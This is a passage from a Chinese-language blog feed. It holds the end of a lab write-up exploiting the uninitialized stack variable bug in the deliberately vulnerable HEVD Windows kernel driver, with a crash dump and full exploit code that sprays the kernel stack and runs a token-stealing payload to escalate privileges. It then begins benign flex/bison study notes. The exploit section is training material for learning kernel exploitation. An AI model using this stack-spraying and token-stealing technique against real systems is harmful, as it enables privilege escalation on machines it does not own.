class="line"></span><br><span class="line">PRODUCT_TYPE:  1</span><br><span class="line"></span><br><span class="line">OSPLATFORM_TYPE:  x86</span><br><span class="line"></span><br><span class="line">OSNAME:  Windows 7</span><br><span class="line"></span><br><span class="line">OSEDITION:  Windows 7 WinNt TerminalServer SingleUserTS</span><br><span class="line"></span><br><span class="line">OS_LOCALE:  </span><br><span class="line"></span><br><span class="line">USER_LCID:  0</span><br><span class="line"></span><br><span class="line">OSBUILD_TIMESTAMP:  2009-07-14 07:15:19</span><br><span class="line"></span><br><span class="line">BUILDDATESTAMP_STR:  090713-1255</span><br><span class="line"></span><br><span class="line">BUILDLAB_STR:  win7_rtm</span><br><span class="line"></span><br><span class="line">BUILDOSVER_STR:  6.1.7600.16385</span><br><span class="line"></span><br><span class="line">ANALYSIS_SESSION_ELAPSED_TIME: 2f92</span><br><span class="line"></span><br><span class="line">ANALYSIS_SOURCE:  KM</span><br><span class="line"></span><br><span class="line">FAILURE_ID_HASH_STRING:  km:ip_misaligned</span><br><span class="line"></span><br><span class="line">FAILURE_ID_HASH:  &#123;201b0e5d-db2a-63d2-77be-8ce8ff234750&#125;</span><br><span class="line"></span><br><span class="line">Followup:     MachineOwner</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>
<p>这里g之后就是直接蓝屏了。</p>
<h4 id="0x03-利用思路"><a href="#0x03-利用思路" class="headerlink" title="0x03:利用思路"></a>0x03:利用思路</h4><p>大致的利用思路如下：</p>
<ul>
<li>   布置内核栈</li>
<li>   触发漏洞</li>
<li>   提权</li>
</ul>
<p>关于内核栈的布置，使用的是<a href="http://j00ru.vexillium.org/?p=769">出自j00ru文章</a>的方法，这里直接使用了HEVD的exploit，我只做一点分析。</p>
<h4 id="0x04-Exploit分析"><a href="#0x04-Exploit分析" class="headerlink" title="0x04:Exploit分析"></a>0x04:Exploit分析</h4><p>HEVD 里的 Exploit代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;UninitializedStackVariable.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">ResolveKernelAPIs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PCHAR KernelImage;</span><br><span class="line">    SIZE_T ReturnLength;</span><br><span class="line">    HMODULE hNtDll = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID HalDispatchTable = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hKernelInUserMode = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID KernelBaseAddressInKernelMode;</span><br><span class="line">    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;</span><br><span class="line">    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;</span><br><span class="line"></span><br><span class="line">    DEBUG_INFO(<span class="string">&quot;\t\t[+] Resolving Kernel APIs\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    hNtDll = LoadLibrary(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hNtDll) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NtQuerySystemInformation) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] NtQuerySystemInformation: 0x%p\n&quot;</span>, NtQuerySystemInformation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NtMapUserPhysicalPages = (NtMapUserPhysicalPages_t)GetProcAddress(hNtDll, <span class="string">&quot;NtMapUserPhysicalPages&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NtMapUserPhysicalPages) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed Resolving NtMapUserPhysicalPages: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] NtMapUserPhysicalPages: 0x%p\n&quot;</span>, NtMapUserPhysicalPages);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NtStatus = NtQuerySystemInformation(SystemModuleInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;ReturnLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate the Heap chunk</span></span><br><span class="line">    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),</span><br><span class="line">                                                                     HEAP_ZERO_MEMORY,</span><br><span class="line">                                                                     ReturnLength);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pSystemModuleInformation) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NtStatus = NtQuerySystemInformation(SystemModuleInformation,</span><br><span class="line">                                        pSystemModuleInformation,</span><br><span class="line">                                        ReturnLength,</span><br><span class="line">                                        &amp;ReturnLength);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NtStatus != STATUS_SUCCESS) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    KernelBaseAddressInKernelMode = pSystemModuleInformation-&gt;Module[<span class="number">0</span>].Base;</span><br><span class="line">    KernelImage = <span class="built_in">strrchr</span>((PCHAR)(pSystemModuleInformation-&gt;Module[<span class="number">0</span>].ImageName), <span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    hKernelInUserMode = LoadLibraryA(KernelImage);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hKernelInUserMode) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed To Load Kernel: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ZwOpenProcess = (ZwOpenProcess_t)GetProcAddress(hKernelInUserMode, <span class="string">&quot;ZwOpenProcess&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwOpenProcess) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed Resolving ZwOpenProcess: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess - (ULONG)hKernelInUserMode);</span><br><span class="line">        ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess + (ULONG)KernelBaseAddressInKernelMode);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] ZwOpenProcess: 0x%p\n&quot;</span>, ZwOpenProcess);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ZwOpenProcessToken = (ZwOpenProcessToken_t)GetProcAddress(hKernelInUserMode, <span class="string">&quot;ZwOpenProcessToken&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwOpenProcessToken) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed Resolving ZwOpenProcessToken: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken - (ULONG)hKernelInUserMode);</span><br><span class="line">        ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken + (ULONG)KernelBaseAddressInKernelMode);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] ZwOpenProcessToken: 0x%p\n&quot;</span>, ZwOpenProcess);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ZwDuplicateToken = (ZwDuplicateToken_t)GetProcAddress(hKernelInUserMode, <span class="string">&quot;ZwDuplicateToken&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwDuplicateToken) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed Resolving ZwDuplicateToken: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken - (ULONG)hKernelInUserMode);</span><br><span class="line">        ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken + (ULONG)KernelBaseAddressInKernelMode);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] ZwDuplicateToken: 0x%p\n&quot;</span>, ZwDuplicateToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PsGetCurrentProcess = (PsGetCurrentProcess_t)GetProcAddress(hKernelInUserMode, <span class="string">&quot;PsGetCurrentProcess&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!PsGetCurrentProcess) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed Resolving PsGetCurrentProcess: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess - (ULONG)hKernelInUserMode);</span><br><span class="line">        PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess + (ULONG)KernelBaseAddressInKernelMode);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] PsGetCurrentProcess: 0x%p\n&quot;</span>, PsGetCurrentProcess);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ZwSetInformationProcess = (ZwSetInformationProcess_t)GetProcAddress(hKernelInUserMode, <span class="string">&quot;ZwSetInformationProcess&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwSetInformationProcess) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed Resolving ZwSetInformationProcess: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess - (ULONG)hKernelInUserMode);</span><br><span class="line">        ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess + (ULONG)KernelBaseAddressInKernelMode);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] ZwSetInformationProcess: 0x%p\n&quot;</span>, ZwSetInformationProcess);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ZwClose = (ZwClose_t)GetProcAddress(hKernelInUserMode, <span class="string">&quot;ZwClose&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwClose) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed Resolving ZwClose: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ZwClose = (ZwClose_t)((ULONG)ZwClose - (ULONG)hKernelInUserMode);</span><br><span class="line">        ZwClose = (ZwClose_t)((ULONG)ZwClose + (ULONG)KernelBaseAddressInKernelMode);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] ZwClose: 0x%p\n&quot;</span>, ZwClose);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)pSystemModuleInformation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hNtDll) &#123;</span><br><span class="line">        FreeLibrary(hNtDll);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hKernelInUserMode) &#123;</span><br><span class="line">        FreeLibrary(hKernelInUserMode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hNtDll = <span class="literal">NULL</span>;</span><br><span class="line">    hKernelInUserMode = <span class="literal">NULL</span>;</span><br><span class="line">    pSystemModuleInformation = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">UninitializedStackVariableThread</span><span class="params">(LPVOID Parameter)</span> </span>&#123;</span><br><span class="line">    UINT32 i = <span class="number">0</span>;</span><br><span class="line">    ULONG BytesReturned;</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG MagicValue = <span class="number">0xBAADF00D</span>;</span><br><span class="line">    PULONG StackSprayBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    LPCSTR FileName = (LPCSTR)DEVICE_NAME;</span><br><span class="line">    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;</span><br><span class="line">    PVOID EopPayload = &amp;TokenStealingPayloadDuplicateToken;</span><br><span class="line">    SIZE_T StackSprayBufferSize = <span class="number">1024</span> * <span class="keyword">sizeof</span>(ULONG_PTR);</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Setting Thread Priority\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) &#123;</span><br><span class="line">            DEBUG_ERROR(<span class="string">&quot;\t\t[-] Failed To Set As THREAD_PRIORITY_HIGHEST\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t[+] Priority Set To THREAD_PRIORITY_HIGHEST\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the device handle</span></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Getting Device Driver Handle\n&quot;</span>);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Device Name: %s\n&quot;</span>, FileName);</span><br><span class="line"></span><br><span class="line">        hFile = GetDeviceHandle(FileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">            DEBUG_ERROR(<span class="string">&quot;\t\t[-] Failed Getting Device Handle: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t[+] Device Handle: 0x%X\n&quot;</span>, hFile);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Setting Up Vulnerability Stage\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Allocating Memory For Buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        StackSprayBuffer = (PULONG)HeapAlloc(GetProcessHeap(),</span><br><span class="line">                                             HEAP_ZERO_MEMORY,</span><br><span class="line">                                             StackSprayBufferSize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!StackSprayBuffer) &#123;</span><br><span class="line">            DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed To Allocate Memory: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t\t[+] Memory Allocated: 0x%p\n&quot;</span>, StackSprayBuffer);</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t\t[+] Allocation Size: 0x%X\n&quot;</span>, StackSprayBufferSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Preparing Buffer Memory Layout\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//填充buffer</span></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; StackSprayBufferSize / <span class="keyword">sizeof</span>(ULONG_PTR); i++) &#123;</span><br><span class="line">            StackSprayBuffer[i] = (ULONG)EopPayload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] EoP Payload: 0x%p\n&quot;</span>, EopPayload);</span><br><span class="line">        <span class="comment">//找到NtMapUserPhysicalPages API的地址，后面要调用</span></span><br><span class="line">        ResolveKernelAPIs();</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Spraying the Kernel Stack\n&quot;</span>);</span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Triggering Use of Uninitialized Stack Variable\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// HackSys Extreme Vulnerable driver itself provides a decent interface</span></span><br><span class="line">        <span class="comment">// to spray the stack using Stack Overflow vulnerability. However, j00ru</span></span><br><span class="line">        <span class="comment">// on his blog disclosed a Windows API that can be used to spray stack up to</span></span><br><span class="line">        <span class="comment">// 1024*sizeof(ULONG_PTR) bytes (http://j00ru.vexillium.org/?p=769). Since,</span></span><br><span class="line">        <span class="comment">// it&#x27;s a Windows API and available on Windows by default, I decided to use</span></span><br><span class="line">        <span class="comment">// it instead of this driver&#x27;s Stack Overflow interface.</span></span><br><span class="line">        <span class="comment">//喷射kernel stack</span></span><br><span class="line">        NtMapUserPhysicalPages(<span class="literal">NULL</span>, <span class="number">1024</span>, StackSprayBuffer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Kernel Stack should not be used for anything else as it</span></span><br><span class="line">        <span class="comment">// will corrupt the current sprayed state. So, we will directly</span></span><br><span class="line">        <span class="comment">// trigger the vulnerability without putting any Debug prints.</span></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        DeviceIoControl(hFile,</span><br><span class="line">                        HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE,</span><br><span class="line">                        (LPVOID)&amp;MagicValue,</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        <span class="literal">NULL</span>,</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        &amp;BytesReturned,</span><br><span class="line">                        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)StackSprayBuffer);</span><br><span class="line"></span><br><span class="line">        StackSprayBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t[-] Exception: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05: 参考"></a>0x05: 参考</h4><p><a href="http://paper.seebug.org/200/">HEVD Kernel Exploitation – Uninitialized Stack &amp; Heap By k0shl</a><br><a href="http://j00ru.vexillium.org/?p=769">nt!NtMapUserPhysicalPages and Kernel Stack-Spraying Techniques</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>windows kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>flex_bison读书笔记</title>
    <url>/2018/01/06/flex-bison%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00: 起因"></a>0x00: 起因</h4><p>工作上的一些原因需要学习一下。做个记录督促自己读书学习，好好学习。</p>
<a id="more"></a>

<h4 id="0x01-一些概念"><a href="#0x01-一些概念" class="headerlink" title="0x01: 一些概念"></a>0x01: 一些概念</h4><h5 id="语句和表达式"><a href="#语句和表达式" class="headerlink" title="语句和表达式"></a>语句和表达式</h5><ul>
<li>   表达式（Expression）有值，而语句（Statement）不总有。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表达式是可以被求值的代码，而语句是一段可执行代码。</span><br><span class="line">因为表达式可被求值，所以它可写在赋值语句等号的右侧。</span><br><span class="line">而语句不一定有值，所以像import、for和break等语句就不能被用于赋值。</span><br><span class="line">Python的语句分为两大类：简单和复合语句。</span><br><span class="line">简单语句是指一逻辑行的代码。例如表达式语句、赋值语句和return语句等。</span><br><span class="line">复合语句是指包含、影响或控制一组语句的代码。例如if、try和class语句等。</span><br><span class="line">表达式本身可以作为表达式语句，也能作为赋值语句的右值或if语句的条件等，所以表达式可以作为语句的组成部分，但不是必须成分（例如continue语句）。</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="左递归"><a href="#左递归" class="headerlink" title="左递归"></a>左递归</h5><pre><code>一个文法是左递归的，若我们可以找出其中存在某非终端符号A，最终会推导出来的句型(sentential form)里面包含以自己为最左符号(left-symbol)的句型</code></pre>
<ol>
<li>直接左递归</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Expr ----&gt; Expr + Term</span><br></pre></td></tr></table></figure>
<p>举个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A ---&gt; Aa|C</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>间接左递归</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A ---&gt; Ba|C</span><br><span class="line">B ---&gt; Ab|D</span><br></pre></td></tr></table></figure>
<p>这种会产生：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A ---&gt; Ba ---&gt; Aba ---&gt; ...</span><br></pre></td></tr></table></figure>

<h4 id="0x02-高级计算器的实现"><a href="#0x02-高级计算器的实现" class="headerlink" title="0x02: 高级计算器的实现"></a>0x02: 高级计算器的实现</h4><h5 id="先看语法分析的部分："><a href="#先看语法分析的部分：" class="headerlink" title="先看语法分析的部分："></a>先看语法分析的部分：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat fb3<span class="number">-2.</span>y</span><br><span class="line"><span class="comment">/* Companion source code for &quot;flex &amp; bison&quot;, published by O&#x27;Reilly</span></span><br><span class="line"><span class="comment"> * Media, ISBN 978-0-596-15597-1</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2009, Taughannock Networks. All rights reserved.</span></span><br><span class="line"><span class="comment"> * See the README file for license conditions and contact info.</span></span><br><span class="line"><span class="comment"> * $Header: /home/johnl/flnb/code/RCS/fb3-2.y,v 2.1 2009/11/08 02:53:18 johnl Exp $</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* calculator with AST */</span></span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&quot;fb3-2.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">a</span>;</span></span><br><span class="line">  <span class="keyword">double</span> d;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> *<span class="title">s</span>;</span>        <span class="comment">/* which symbol */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symlist</span> *<span class="title">sl</span>;</span></span><br><span class="line">  <span class="keyword">int</span> fn;            <span class="comment">/* which function */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* declare tokens */</span> 表明类型</span><br><span class="line">%token &lt;d&gt; NUMBER</span><br><span class="line">%token &lt;s&gt; NAME</span><br><span class="line">%token &lt;fn&gt; FUNC</span><br><span class="line">%token EOL</span><br><span class="line"></span><br><span class="line">%token IF THEN ELSE WHILE DO LET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//right、left表明了结合顺序，即优先级</span></span><br><span class="line">%nonassoc &lt;fn&gt; CMP</span><br><span class="line">%right <span class="string">&#x27;=&#x27;</span></span><br><span class="line">%left <span class="string">&#x27;+&#x27;</span> <span class="string">&#x27;-&#x27;</span></span><br><span class="line">%left <span class="string">&#x27;*&#x27;</span> <span class="string">&#x27;/&#x27;</span></span><br><span class="line">%nonassoc <span class="string">&#x27;|&#x27;</span> UMINUS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//把值&lt;a&gt;赋值给了 stmt list explist 三者</span></span><br><span class="line">%type &lt;a&gt; <span class="built_in">exp</span> stmt <span class="built_in">list</span> explist</span><br><span class="line"><span class="comment">//同理</span></span><br><span class="line">%type &lt;sl&gt; symlist</span><br><span class="line"></span><br><span class="line">%start calclist</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="comment">//语句，调用相对应的方法，生成AST</span></span><br><span class="line">stmt: IF <span class="built_in">exp</span> THEN <span class="built_in">list</span>           &#123; $$ = newflow(<span class="string">&#x27;I&#x27;</span>, $<span class="number">2</span>, $<span class="number">4</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | IF <span class="built_in">exp</span> THEN <span class="built_in">list</span> ELSE <span class="built_in">list</span>  &#123; $$ = newflow(<span class="string">&#x27;I&#x27;</span>, $<span class="number">2</span>, $<span class="number">4</span>, $<span class="number">6</span>); &#125;</span><br><span class="line">   | WHILE <span class="built_in">exp</span> DO <span class="built_in">list</span>           &#123; $$ = newflow(<span class="string">&#x27;W&#x27;</span>, $<span class="number">2</span>, $<span class="number">4</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">//右递归</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>: <span class="comment">/* nothing */</span> &#123; $$ = <span class="literal">NULL</span>; &#125;</span><br><span class="line">   | stmt <span class="string">&#x27;;&#x27;</span> <span class="built_in">list</span> &#123; <span class="keyword">if</span> ($<span class="number">3</span> == <span class="literal">NULL</span>)</span><br><span class="line">                    $$ = $<span class="number">1</span>;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">            $$ = newast(<span class="string">&#x27;L&#x27;</span>, $<span class="number">1</span>, $<span class="number">3</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">   ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//表达式的ast构建</span></span><br><span class="line"><span class="built_in">exp</span>: <span class="built_in">exp</span> CMP <span class="built_in">exp</span>          &#123; $$ = newcmp($<span class="number">2</span>, $<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">&#x27;+&#x27;</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">&#x27;+&#x27;</span>, 